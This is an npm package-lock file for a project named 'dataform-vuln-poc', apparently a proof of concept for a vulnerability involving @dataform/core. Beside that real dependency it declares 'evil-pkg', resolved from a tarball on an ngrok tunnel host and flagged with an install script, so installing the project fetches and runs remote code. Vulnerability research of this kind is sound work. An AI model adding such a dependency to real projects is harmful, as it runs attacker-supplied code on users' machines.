{
  "name": "dataform-vuln-poc",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "dataform-vuln-poc",
      "version": "1.0.0",
      "dependencies": {
        "@dataform/core": "^2.9.0",
        "evil-pkg": "https://b085ce372309.ngrok-free.app/evil-package.tgz"
      }
    },
    "node_modules/@dataform/core": {
      "version": "2.9.0",
      "resolved": "https://registry.npmjs.org/@dataform/core/-/core-2.9.0.tgz",
      "integrity": "sha512-S0aJMpof0uxL7Sodi7CH3ewlN83NFm0kRDvWoBfc0prw/a5wVIAY1LZWeg/6icqKPUw5b5xWn2ub82YrD8zVTg==",
      "license": "MIT"
    },
    "node_modules/evil-pkg": {
      "version": "1.0.0",
      "resolved": "https://b085ce372309.ngrok-free.app/evil-package.tgz",
      "integrity": "sha512-4D/FOnxx2U06GKy4xFUGqgmzQCxwXnUHrtr7mcbcs0GUSA9FNORj6GlhLEzAlvkY2tCzTXB4Ts+HUUhKcYjsvQ==",
      "hasInstallScript": true,
      "license": "MIT"
    }
  }
}
